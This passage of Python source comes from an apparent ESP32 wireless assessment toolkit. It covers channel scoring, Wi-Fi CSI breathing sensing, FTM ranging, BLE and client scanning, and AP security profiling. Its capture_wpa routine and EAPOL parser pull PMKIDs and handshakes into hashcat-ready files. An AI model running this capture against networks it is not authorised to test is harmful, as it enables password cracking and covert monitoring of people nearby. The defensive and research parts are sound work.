                             "retries": int(p[4]), "networks": int(p[5]), "dwell_ms": int(p[6])})
            except ValueError:
                continue

    if not rows:
        H.say("no channel data returned — the board may still be sweeping", "r")
        return 1

    scored = score_channels(rows)
    best = scored[0]
    for row in scored[:5]:
        colour = "g" if row["channel"] == best["channel"] else "d"
        H.say(f"ch {row['channel']:>2}  interference {row['interference_us']:>9} us  "
              f"frames {row['frames']:>5}  retries {row['retry_share']*100:>5.1f}%  "
              f"overlapping networks {row['overlapping_networks']}", colour)
    H.say(f"least contended: channel {best['channel']}", "g")
    print("CONG_JSON " + json.dumps({"channels": scored, "recommended": best["channel"],
                                     "sweeps": sweeps, "dwell_ms": dwell,
                                     "flashed": True, "complete": True}))
    return 0


def csi_raw(a):
    """Flash the raw exporter, capture a window, and characterise the time base.

    Deliberately does NOT analyse. The value of this path is that it hands over
    the measurement untouched; drawing a conclusion here would reintroduce the
    processing the export exists to avoid.
    """
    import json
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    channel = int(getattr(a, "channel", 0) or 0)
    if not (1 <= channel <= 14):
        H.say("csi-raw needs --channel 1-14", "r"); return 2
    seconds = int(getattr(a, "seconds", 0) or 60)
    bssid = getattr(a, "bssid", None)
    ssid = getattr(a, "ssid", None)
    password = getattr(a, "password", None)
    ping_ms = int(getattr(a, "ping_ms", 0) or 25)

    # Credentials go in as build defines and land in the generated target
    # header, which the build deletes afterwards and .gitignore covers. They
    # are never echoed to the console — a password in a terminal scrollback is
    # a password in a screenshot.
    extra, strings = [], {}
    if ssid:
        extra += ["MEDUSA_CSI_ACTIVE=1", f"CSI_PING_MS={ping_ms}"]
        strings["TARGET_WIFI_SSID"] = ssid
        strings["TARGET_WIFI_PASS"] = password or ""
        # In active mode the AP picks the channel and its BSSID may be
        # randomised, so neither can be pinned at build time.
        bssid = None

    sketch = os.path.join(HERE, "medusa_csi_raw")
    out = tempfile.mkdtemp(prefix=f"medusa_csiraw_{arch['target']}_")
    bns = types.SimpleNamespace(chip=chip, port=None, sketch=sketch, out=out, fqbn=None,
                                no_patch=True, bssid=bssid, channel=channel,
                                client=None, ssid=None, payload=None,
                                extra_defines=extra, string_defines=strings)
    if build(bns) != 0:
        H.say("csi-raw firmware build failed", "r"); return 1
    fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
    if flash(fns) != 0:
        H.say("csi-raw firmware flash failed", "r"); return 1

    raw_path = getattr(a, "save", None) or os.path.join(out, "csi_raw.tsv")
    if ssid:
        H.say(f"active mode: joining '{ssid}' and pinging its gateway every {ping_ms}ms", "b")
    H.say(f"capturing raw CSI for {seconds}s -> {raw_path}", "b")
    if not bssid and not ssid:
        H.say("no --bssid: every transmitter is exported (more data, mixed layouts)", "y")
    time.sleep(2)
    rd = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, str(seconds)],
                        capture_output=True, text=True)
    stream = rd.stdout or ""
    with open(raw_path, "w") as fh:
        fh.write(stream)
    if not stream.strip():
        H.say(f"nothing arrived on {a.port} — the board may still be resetting", "r")
        return 1

    r = subprocess.run(["python3", os.path.join(HERE, "medusa_csi_raw_read.py"),
                        "--capture", raw_path, "--json"], capture_output=True, text=True)
    try:
        result = json.loads(r.stdout or "")
    except ValueError:
        H.say("decoder did not return a result", "r")
        if r.stderr:
            H.say(r.stderr.strip().splitlines()[-1], "r")
        return 1

    drops = result.get("drops")
    if drops and drops.get("dropped"):
        pct = 100.0 * drops["dropped"] / max(1, drops["received"])
        H.say(f"{drops['dropped']}/{drops['received']} frames dropped ({pct:.1f}%) — "
              f"the series is not evenly sampled", "r")
    for nsub, g in sorted(result.get("layouts", {}).items()):
        s = g["sampling"]
        if not s.get("usable"):
            H.say(f"layout {nsub}: {g['records']} records, unusable ({s.get('reason')})", "y")
            continue
        verdict = (f"supports breathing to {s['max_bpm_supported']} bpm"
                   if s["breathing_supported"] else "TOO SLOW for breathing (would alias)")
        colour = "g" if s["breathing_supported"] else "y"
        H.say(f"layout {nsub}: {g['records']} records, {s['rate_hz']} Hz, "
              f"jitter {s['jitter_fraction']}, {verdict}", colour)
    H.say(f"raw stream: {raw_path}", "b")
    print("CSIRAW_JSON " + json.dumps({**result, "path": raw_path,
                                       "flashed": True, "complete": True}))
    return 0


def vitals(a):
    """Capture raw CSI and estimate respiration rate. Emits `VITALS_JSON {...}`.

    Thin on purpose: it captures with the raw exporter and hands the file to
    medusa_csi_vitals, which owns every judgement. Splitting capture from
    analysis means a run can be re-analysed later with a different band or
    signal without going back to the hardware — which matters, because a
    validation run against a counted breathing rate is expensive to repeat.
    """
    import json
    seconds = int(getattr(a, "seconds", 0) or 90)

    # PREFLIGHT. Sensing rate is bounded by how much the TARGET talks, not by
    # how long you watch, and picking an idle access point is the failure mode
    # that wastes a validation run — you only find out after the subject has
    # spent two minutes breathing to a metronome. So when no transmitter is
    # named, spend twenty seconds finding one that is actually fast enough.
    if not getattr(a, "bssid", None) and not getattr(a, "ssid", None):
        H.say("no --bssid: surveying for a transmitter fast enough to sense against…", "b")
        probe_dir = tempfile.mkdtemp(prefix="medusa_vitals_probe_")
        probe_path = os.path.join(probe_dir, "probe.tsv")
        probe_ns = types.SimpleNamespace(
            port=a.port, chip=getattr(a, "chip", None), channel=a.channel,
            bssid=None, seconds=20, save=probe_path)
        if csi_raw(probe_ns) != 0:
            H.say("preflight capture failed", "r"); return 1
        pr = subprocess.run(["python3", os.path.join(HERE, "medusa_csi_raw_read.py"),
                             "--capture", probe_path, "--json"], capture_output=True, text=True)
        try:
            probe = json.loads(pr.stdout or "")
        except ValueError:
            H.say("preflight decode failed", "r"); return 1

        best, best_rate = None, 0.0
        for nsub, g in probe.get("layouts", {}).items():
            samp = g.get("sampling", {})
            if not samp.get("usable") or not samp.get("breathing_supported"):
                continue
            # Attribute the layout's rate to whichever transmitter dominated it.
            for mac, count in sorted(g.get("transmitters", {}).items(), key=lambda x: -x[1])[:1]:
                share = count / max(1, g["records"])
                rate = samp["rate_hz"] * share
                if rate > best_rate:
                    best, best_rate = mac, rate
        if not best:
            H.say("no transmitter in range is busy enough to sense against.", "r")
            H.say("Generate traffic on a network you own (a continuous ping to its "
                  "gateway) and retry — capturing for longer will not help.", "y")
            return 1
        H.say(f"selected {best} (~{best_rate:.1f} Hz of usable frames)", "g")
        a.bssid = best

    raw_ns = types.SimpleNamespace(
        port=a.port, chip=getattr(a, "chip", None), channel=a.channel,
        bssid=getattr(a, "bssid", None), seconds=seconds,
        save=getattr(a, "save", None),
        ssid=getattr(a, "ssid", None), password=getattr(a, "password", None),
        ping_ms=getattr(a, "ping_ms", None))
    rc = csi_raw(raw_ns)
    if rc != 0:
        return rc

    # csi_raw printed the path on its JSON line; recover it rather than
    # recomputing, so the two commands can never disagree about which file.
    raw_path = getattr(a, "save", None)
    if not raw_path:
        H.say("vitals needs --save to keep the capture for analysis", "r")
        return 2

    cmd = ["python3", os.path.join(HERE, "medusa_csi_vitals.py"),
           "--capture", raw_path, "--json"]
    for flag, val in (("--mac", getattr(a, "bssid", None)),
                      ("--signal", getattr(a, "signal", None)),
                      ("--min-bpm", getattr(a, "min_bpm", None)),
                      ("--max-bpm", getattr(a, "max_bpm", None)),
                      ("--expect", getattr(a, "expect", None))):
        if val is not None:
            cmd += [flag, str(val)]
    r = subprocess.run(cmd, capture_output=True, text=True)
    try:
        out = json.loads(r.stdout or "")
    except ValueError:
        H.say("respiration analyser did not return a result", "r")
        if r.stderr:
            H.say(r.stderr.strip().splitlines()[-1], "r")
        return 1

    res = out.get("result")
    if res == "REFUSED":
        H.say(f"REFUSED — {out.get('reason')}", "r")
    elif res == "BREATHING":
        H.say(f"BREATHING: {out['bpm']} bpm ({out['detail']})", "g")
        if "error_bpm" in out:
            H.say(f"ground truth {out['expected_bpm']} bpm -> error {out['error_bpm']:+.2f} bpm",
                  "g" if abs(out["error_bpm"]) <= 2 else "y")
    elif res == "EDGE_PEAK":
        H.say(f"EDGE PEAK — {out.get('detail')}", "y")
    elif res == "NO_PERIODIC_SIGNAL":
        H.say("no periodic signal in the band", "y")
    else:
        H.say(f"{res}: {out.get('detail')}", "y")
    print("VITALS_JSON " + json.dumps(out))
    return 0


def ftm(a):
    """Flash the FTM ranger and report measured distance to a peer.

    Emits `FTM_JSON {...}`. An UNSUPPORTED verdict is a fact about the peer —
    most consumer APs do not implement 802.11mc — and is reported as a result,
    not as a failure of the tool.
    """
    import json
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    channel = int(getattr(a, "channel", 0) or 0)
    if not (1 <= channel <= 14):
        H.say("ftm needs --channel 1-14", "r"); return 2
    responder = bool(getattr(a, "responder", False))
    survey = bool(getattr(a, "survey", False))
    bssid = getattr(a, "bssid", None)
    if not responder and not survey and not bssid:
        H.say("ftm initiator needs --bssid (the peer to range)", "r"); return 2
    seconds = int(getattr(a, "seconds", 0) or 30)
    # 802.11mc allows a small set of burst sizes; a peer may accept one and
    # reject another, so these are tunable rather than compiled in.
    frm_count = int(getattr(a, "frames", 0) or 32)
    burst_period = int(getattr(a, "burst", 0) or 2)

    sketch = os.path.join(HERE, "medusa_ftm")
    out = tempfile.mkdtemp(prefix=f"medusa_ftm_{arch['target']}_")
    bns = types.SimpleNamespace(chip=chip, port=None, sketch=sketch, out=out, fqbn=None,
                                no_patch=True, bssid=bssid, channel=channel,
                                client=None, ssid=None, payload=None,
                                extra_defines=([f"FTM_FRAME_COUNT={frm_count}",
                                                f"FTM_BURST_PERIOD={burst_period}"]
                                               + (["MEDUSA_FTM_RESPONDER=1"] if responder else [])
                                               + (["MEDUSA_FTM_SURVEY=1"] if survey else [])))
    if build(bns) != 0:
        H.say("ftm firmware build failed", "r"); return 1
    fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
    if flash(fns) != 0:
        H.say("ftm firmware flash failed", "r"); return 1

    if responder:
        H.say(f"FTM responder up on ch {channel} — range it from a second board", "g")
        print("FTM_JSON " + json.dumps({"role": "responder", "channel": channel,
                                        "flashed": True, "complete": True}))
        return 0

    if survey:
        H.say(f"surveying every AP in range for FTM support ({seconds}s)…", "b")
    else:
        H.say(f"ranging {bssid} on ch {channel} for {seconds}s…", "b")
    time.sleep(2)
    r = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, str(seconds)],
                       capture_output=True, text=True)

    measurements, statuses = [], {}
    per_peer = {}
    for line in (r.stdout or "").splitlines():
        p = line.split("\t")
        if len(p) >= 7 and p[0] == "FTM":
            status = p[3]
            if status.replace("_", "").isalpha():
                per_peer.setdefault(p[2], {})
                per_peer[p[2]][status] = per_peer[p[2]].get(status, 0) + 1
            # The reader can attach mid-line while the board is still booting,
            # so a fragment occasionally lands in the status column. Counting it
            # put a meaningless "1" beside the real verdicts in every report.
            if not status.replace("_", "").isalpha():
                continue
            statuses[status] = statuses.get(status, 0) + 1
            if status == "SUCCESS":
                try:
                    measurements.append({"rtt_ns": int(p[4]), "dist_cm": int(p[5]), "frames": int(p[6])})
                except ValueError:
                    pass

    if measurements:
        dists = sorted(m["dist_cm"] for m in measurements)
        median = dists[len(dists) // 2]
        H.say(f"{len(measurements)} successful exchanges, median {median} cm", "g")
        print("FTM_JSON " + json.dumps({"role": "initiator", "peer": bssid, "channel": channel,
                                        "measurements": len(measurements), "median_cm": median,
                                        "min_cm": dists[0], "max_cm": dists[-1],
                                        "statuses": statuses, "flashed": True, "complete": True}))
        return 0

    if survey:
        capable = [mac for mac, st in per_peer.items() if "SUCCESS" in st]
        for mac, st in sorted(per_peer.items()):
            verdict = "SUPPORTS FTM" if "SUCCESS" in st else max(st, key=st.get)
            H.say(f"  {mac}  {verdict}", "g" if "SUCCESS" in st else "d")
        if capable:
            H.say(f"{len(capable)} of {len(per_peer)} APs support 802.11mc ranging", "g")
        else:
            # Identical refusals across unrelated vendors is the signature of
            # nothing in range implementing a responder, rather than of a
            # parameter this sweep happened to get wrong.
            kinds = {k for st in per_peer.values() for k in st}
            H.say(f"none of {len(per_peer)} APs in range answered a ranging request "
                  f"(statuses seen: {', '.join(sorted(kinds)) or 'none'})", "y")
        print("FTM_JSON " + json.dumps({"role": "survey", "channel": channel,
                                        "peers": per_peer, "ftm_capable": capable,
                                        "peers_total": len(per_peer),
                                        "frames": frm_count, "burst_period": burst_period,
                                        "flashed": True, "complete": True}))
        return 0

    dominant = max(statuses, key=statuses.get) if statuses else "NO_REPORT"
    # Only SUCCESS proves support and only UNSUPPORTED disproves it. Everything
    # between is genuinely unknown, and an earlier version reported
    # peer_supports_ftm:true for CONF_REJECTED — reading "the peer answered" as
    # "the peer can do this". A rejection is equally consistent with an AP that
    # parses the request and declines outright.
    if dominant == "UNSUPPORTED":
        supports = False
        H.say(f"{bssid} does not implement 802.11mc FTM — a finding about the AP, not a tool failure", "y")
    elif dominant == "CONF_REJECTED":
        supports = None
        H.say(f"{bssid} rejected these burst parameters. That is not proof it supports FTM, "
              f"nor that it does not — try --frames/--burst before concluding either.", "y")
    else:
        supports = None
        H.say(f"no successful exchange (dominant status: {dominant})", "y")
    print("FTM_JSON " + json.dumps({"role": "initiator", "peer": bssid, "channel": channel,
                                    "measurements": 0, "statuses": statuses,
                                    "frames": frm_count, "burst_period": burst_period,
                                    "peer_supports_ftm": supports,
                                    "flashed": True, "complete": True}))
    return 0


def ble_scan(a):
    """Flash the BLE scanner, read serial, emit nearby BLE devices.
    Prints `BLESCAN_JSON {devices:[{addr,rssi,name,vendor}]}`."""
    import json
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    seconds = int(getattr(a, "seconds", 0) or 10)
    with tempfile.TemporaryDirectory(prefix=f"medusa_blescan_{arch['target']}_") as out:
        bns = types.SimpleNamespace(chip=chip, port=None, sketch=os.path.join(HERE, "medusa_blescan"),
                                    out=out, fqbn=None, no_patch=True, bssid=None, channel=None)
        if build(bns) != 0:
            H.say("BLE scan firmware build failed", "r"); return 1
        fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
        if flash(fns) != 0:
            H.say("BLE scan firmware flash failed", "r"); return 1

        H.say(f"scanning BLE for {seconds}s…", "b")
        time.sleep(2)
        r = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, str(seconds)],
                           capture_output=True, text=True)
        devices, protocol_complete = _parse_blescan_output(r.stdout)
        complete = r.returncode == 0 and protocol_complete
        error = None if complete else ("serial reader failed" if r.returncode != 0 else "scan completion markers missing or invalid")
        if not complete:
            devices = []
            H.say(f"Bluetooth survey readback failed: {error}", "r")
        payload = {"devices": devices, "flashed": True, "complete": complete}
        if error:
            payload["error"] = error
        print("BLESCAN_JSON " + json.dumps(payload))
        if not complete:
            return 1
        H.say(f"found {len(devices)} BLE device(s)", "g")
        return 0


def _eapol_info(raw):
    """Parse a raw 802.11 data frame carrying EAPOL-Key. Returns
    dict(ap, sta, msg, pmkid) — MACs as lowercase hex (no colons), msg 1..4 (0 if
    unknown), pmkid 32-hex or None — or None if the frame is not EAPOL."""
    if len(raw) < 34 or ((raw[0] >> 2) & 0x3) != 2:            # data frames only
        return None
    fc1 = raw[1]
    to_ds, from_ds = fc1 & 0x01, (fc1 >> 1) & 0x01
    subtype = (raw[0] >> 4) & 0xF
    hdr = 24 + (2 if (subtype & 0x08) else 0)                  # +2 for QoS data
    a1, a2, a3 = raw[4:10], raw[10:16], raw[16:22]
    if from_ds and not to_ds:      ap, sta = a2, a1            # AP -> STA
    elif to_ds and not from_ds:    ap, sta = a1, a2            # STA -> AP
    else:                          ap, sta = a3, a2
    idx = None                                                 # find EtherType 0x888E
    for i in range(hdr, min(len(raw) - 1, hdr + 16)):
        if raw[i] == 0x88 and raw[i + 1] == 0x8e:
            idx = i + 2; break
    if idx is None or idx + 4 > len(raw):
        return None
    if raw[idx + 1] != 3:                                      # EAPOL-Key type
        return {"ap": ap.hex(), "sta": sta.hex(), "msg": 0, "pmkid": None}
    body = idx + 4
    if body + 3 > len(raw):
        return {"ap": ap.hex(), "sta": sta.hex(), "msg": 0, "pmkid": None}
    key_info = (raw[body + 1] << 8) | raw[body + 2]
    mic = (key_info >> 8) & 1; ack = (key_info >> 7) & 1
    install = (key_info >> 6) & 1; secure = (key_info >> 9) & 1
    if ack and not mic:                 msg = 1
    elif mic and not ack and not secure: msg = 2
    elif mic and ack and install:        msg = 3
    elif mic and not ack and secure:     msg = 4
    else:                                msg = 0
    pmkid = None
    kdl_off = body + 1 + 2 + 2 + 8 + 32 + 16 + 8 + 8 + 16      # after MIC → key-data-length
    if kdl_off + 2 <= len(raw):
        kdl = (raw[kdl_off] << 8) | raw[kdl_off + 1]
        kd = raw[kdl_off + 2: kdl_off + 2 + kdl]
        j = 0
        while j + 6 <= len(kd):
            if kd[j] == 0xDD and kd[j + 2] == 0x00 and kd[j + 3] == 0x0F and kd[j + 4] == 0xAC and kd[j + 5] == 0x04:
                pm = kd[j + 6: j + 6 + 16]
                if len(pm) == 16 and any(pm):
                    pmkid = pm.hex()
                break
            j += (2 + kd[j + 1]) if kd[j] == 0xDD else 1
    return {"ap": ap.hex(), "sta": sta.hex(), "msg": msg, "pmkid": pmkid}


def write_hc22000(path, entries):
    """entries: list of dict(pmkid, ap, sta, essid_hex). Writes hashcat-22000
    PMKID lines: WPA*01*<pmkid>*<mac_ap>*<mac_sta>*<essid_hex>***"""
    lines = [f"WPA*01*{e['pmkid']}*{e['ap']}*{e['sta']}*{e.get('essid_hex','')}***" for e in entries]
    with open(path, "w") as f:
        f.write("\n".join(lines) + ("\n" if lines else ""))
    return path


def capture_wpa(a):
    """Run an authorized active reassociation assessment and package evidence.

    This helper is disabled by default and requires MEDUSA_ACTIVE_LAB=1. A
    successful build or flash is not itself evidence that RF transmission or a
    capture occurred; the returned runtime observations remain separate proof.
    """
    import json
    if os.environ.get("MEDUSA_ACTIVE_LAB") != "1":
        H.say("capture-wpa is disabled by default; authorized active assessment requires MEDUSA_ACTIVE_LAB=1.", "r")
        return 2
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    bssid = getattr(a, "bssid", None)
    channel = int(getattr(a, "channel", 0) or 0)
    if not bssid or len(bssid.split(":")) != 6 or not (1 <= channel <= 14):
        H.say("capture-wpa needs --bssid and --channel 1-14", "r"); return 2
    client = getattr(a, "client", None)
    ssid = getattr(a, "ssid", None) or ""
    seconds = int(getattr(a, "seconds", 0) or 25)
    sketch = os.path.join(HERE, "medusa_pmkid")
    out = os.path.join("/tmp", f"medusa_pmkid_{arch['target']}")
    bns = types.SimpleNamespace(chip=chip, port=None, sketch=sketch, out=out, fqbn=None,
                                no_patch=False, bssid=bssid, channel=channel, client=client, ssid=None)
    if build(bns) != 0:
        H.say("pmkid firmware build failed", "r"); return 1
    fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
    if flash(fns) != 0:
        H.say("pmkid firmware flash failed", "r"); return 1

    H.say(f"running authorized reassociation assessment on ch {channel} for {seconds}s…", "b")
    time.sleep(2)
    r = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, str(seconds)],
                       capture_output=True, text=True)
    frames, pmkids, msgs = [], {}, set()
    essid_hex = ssid.encode("utf-8", "ignore").hex()
    for line in (r.stdout or "").splitlines():
        p = line.split("\t")
        if len(p) >= 4 and p[0] == "PKT":
            try:
                raw = bytes.fromhex(p[3].strip())
            except ValueError:
                continue
            info = _eapol_info(raw)
            if not info:
                continue
            frames.append(raw)
            if info["msg"]:
                msgs.add(info["msg"])
            if info["pmkid"]:
                key = (info["ap"], info["sta"], info["pmkid"])
                pmkids[key] = {"pmkid": info["pmkid"], "ap": info["ap"], "sta": info["sta"], "essid_hex": essid_hex}
    ch = channel
    pcap_path = os.path.join("/tmp", f"medusa_capture_wpa_ch{ch}.pcap")
    hc_path = os.path.join("/tmp", f"medusa_wpa_ch{ch}.hc22000")
    write_pcap(pcap_path, frames)
    write_hc22000(hc_path, list(pmkids.values()))
    handshake = {1, 2}.issubset(msgs) or {2, 3}.issubset(msgs)   # a crackable pair present
    H.say(f"{len(pmkids)} PMKID, {len(frames)} EAPOL frames, msgs={sorted(msgs)} → {hc_path}", "g")
    print("WPA_JSON " + json.dumps({"pmkid": len(pmkids), "eapol": len(frames), "handshake": handshake,
                                    "msgs": sorted(msgs), "hc22000": hc_path, "pcap": pcap_path, "channel": ch}))
    return 0


def _configuration_findings(ap):
    """Evidence-led configuration findings and defensive remediation."""
    pmf = (ap.get("pmf") or "unknown").lower()
    auth = (ap.get("auth") or "UNKNOWN").upper()
    cipher = (ap.get("cipher") or "UNKNOWN").upper()
    findings = {}

    if auth == "OPEN":
        findings["authentication"] = ["review", "Open configuration advertised; verify guest isolation or enable WPA2/WPA3."]
    elif auth == "WEP":
        findings["authentication"] = ["replace", "Deprecated WEP advertised; migrate the network and its clients to WPA2/WPA3."]
    elif auth in ("UNKNOWN", ""):
        findings["authentication"] = ["unknown", "Authentication capabilities were not captured; repeat the security profile."]
    elif "WPA3" in auth:
        findings["authentication"] = ["observed", f"{auth} advertised; verify the configured transition policy matches client requirements."]
    else:
        findings["authentication"] = ["observed", f"{auth} advertised; review password and rotation policy separately."]

    if pmf == "required":
        findings["pmf"] = ["observed", "Protected Management Frames are advertised as required."]
    elif pmf == "capable":
        findings["pmf"] = ["review", "PMF is advertised as optional; require it where the client estate supports it."]
    elif pmf == "none":
        findings["pmf"] = ["review", "PMF was not advertised; enable it where supported and confirm client compatibility."]
    else:
        findings["pmf"] = ["unknown", "PMF capability was not captured; repeat the security profile."]

    findings["wps"] = (["review", "WPS is advertised; disable it when push-button or PIN enrollment is not required."]
                       if ap.get("wps") else ["observed", "WPS was not advertised in the captured capabilities."])
    if cipher in ("UNKNOWN", ""):
        findings["cipher"] = ["unknown", "Cipher capability was not captured; repeat the security profile."]
    elif "WEP" in cipher or "TKIP" in cipher:
        findings["cipher"] = ["replace", f"Deprecated {cipher} advertised; configure CCMP/AES with WPA2 or WPA3."]
    else:
        findings["cipher"] = ["observed", f"{cipher} advertised; verify the access-point configuration matches policy."]
    return findings


def recon(a):
    """Read advertised RSN/PMF/WPS capabilities and defensive findings."""
    import json
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    sketch = os.path.join(HERE, "medusa_recon")
    out = tempfile.mkdtemp(prefix=f"medusa_recon_{arch['target']}_")
    bns = types.SimpleNamespace(chip=chip, port=None, sketch=sketch, out=out,
                                fqbn=None, no_patch=True, bssid=None,
                                channel=getattr(a, "channel", None), client=None,
                                ssid=None, payload=None)
    if build(bns) != 0:
        H.say("recon firmware build failed", "r"); return 1   # build's finally removes the header
    fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
    if flash(fns) != 0:
        H.say("recon firmware flash failed", "r"); return 1

    H.say("reading AP capabilities off the air…", "b")
    time.sleep(2)
    r = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, "16"],
                       capture_output=True, text=True)
    aps, protocol_complete = _parse_recon_output(r.stdout)
    complete = r.returncode == 0 and protocol_complete
    error = None if complete else ("serial reader failed" if r.returncode != 0 else "recon completion markers missing or invalid")
    if not complete:
        aps = []
        H.say(f"security-profile readback failed: {error}", "r")
    H.say(f"profiled {len(aps)} AP(s)", "g")
    payload = {"aps": aps, "flashed": True, "complete": complete}
    if error:
        payload["error"] = error
    print("RECON_JSON " + json.dumps(payload))
    return 0 if complete else 1


def scan_clients(a):
    """Flash a station sniffer, list clients talking to the target AP.
    Emits `CLIENTS_JSON {clients:[{mac,rssi,packets}]}`."""
    import json
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    bssid, channel = getattr(a, "bssid", None), getattr(a, "channel", None)
    if not (bssid and channel):
        H.say("scan-clients needs --bssid and --channel", "r"); return 2
    parts = bssid.split(":")
    if len(parts) != 6:
        H.say(f"invalid BSSID: {bssid}", "r"); return 2
    sketch = os.path.join(HERE, "medusa_clientscan")
    out = tempfile.mkdtemp(prefix=f"medusa_clientscan_{arch['target']}_")
    bns = types.SimpleNamespace(chip=chip, port=None, sketch=sketch, out=out,
                                fqbn=None, no_patch=True, bssid=bssid, channel=channel,
                                client=None, ssid=None, payload=None)
    if build(bns) != 0:
        H.say("client-scan firmware build failed", "r"); return 1   # build's finally removes the header
    fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
    if flash(fns) != 0:
        H.say("client-scan firmware flash failed", "r"); return 1

    H.say("sniffing clients on the AP…", "b")
    time.sleep(2)
    r = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, "18"],
                       capture_output=True, text=True)
    clients, protocol_complete = _parse_clientscan_output(r.stdout)
    complete = r.returncode == 0 and protocol_complete
    error = None if complete else ("serial reader failed" if r.returncode != 0 else "client-scan completion markers missing or invalid")
    if not complete:
        clients = []
        H.say(f"client-scan readback failed: {error}", "r")
    H.say(f"found {len(clients)} client(s)", "g")
    payload = {"clients": clients, "flashed": True, "complete": complete}
    if error:
        payload["error"] = error
    print("CLIENTS_JSON " + json.dumps(payload))
    return 0 if complete else 1
